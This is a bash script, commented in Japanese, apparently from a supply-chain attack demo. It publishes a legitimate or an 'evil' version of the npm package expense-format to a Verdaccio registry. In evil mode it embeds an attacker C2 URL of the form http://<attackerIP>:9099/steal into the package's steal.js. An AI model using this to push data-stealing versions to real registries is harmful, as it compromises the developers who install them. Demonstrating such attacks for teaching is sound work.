#!/usr/bin/env bash
# GCE 上の Verdaccio に expense-format を publish する。
#   REG=http://<VM_IP>:4873/ gce/publish.sh good   → 1.0.0（正規のバージョン）
#   REG=http://<VM_IP>:4873/ gce/publish.sh evil   → 1.0.1（悪性シミュレーション・デモ時）
#
# 悪性のバージョンの送信先(C2)を埋め込む場合:
#   ATTACKER=http://<attackerIP>:9099/steal REG=http://<VM_IP>:4873/ gce/publish.sh evil
#   （Cloud Build ではビルドに env を渡す手段が限られるため、送信先を publish 時にパッケージへ埋め込む）
set -euo pipefail
DIR="$(cd "$(dirname "$0")/.." && pwd)"   # demo root
REG="${REG:?REG=http://<VM_IP>:4873/ を指定してください}"

case "${1:-}" in
  good) PKG="$DIR/registry/expense-format-good" ;;
  evil) PKG="$DIR/registry/expense-format-evil" ;;
  *) echo "使い方: REG=http://<VM_IP>:4873/ publish.sh good|evil" >&2; exit 1 ;;
esac

# evil かつ ATTACKER 指定時は temp コピーに送信先を埋め込んで publish する。
WORKPKG="$PKG"
CLEANUP=""
if [ "${1:-}" = "evil" ] && [ -n "${ATTACKER:-}" ]; then
  WORKPKG="$(mktemp -d)"
  cp -R "$PKG/." "$WORKPKG/"
  ATTACKER="$ATTACKER" perl -pi -e 's{http://127\.0\.0\.1:9099/steal}{$ENV{ATTACKER}}g' "$WORKPKG/steal.js"
  CLEANUP="$WORKPKG"
  echo "送信先(C2)を埋め込み: $ATTACKER"
fi

host="$(printf '%s' "$REG" | sed -E 's#^https?://##; s#/$##')"
cd "$WORKPKG"
echo "//$host/:_authToken=demo-token" > .npmrc
trap 'rm -f "$WORKPKG/.npmrc"; [ -n "$CLEANUP" ] && rm -rf "$CLEANUP"' EXIT
npm publish --registry "$REG" 2>&1 | tail -3 || true
echo "publish 完了: expense-format@$(node -p "require('./package.json').version") ($1) → $REG"
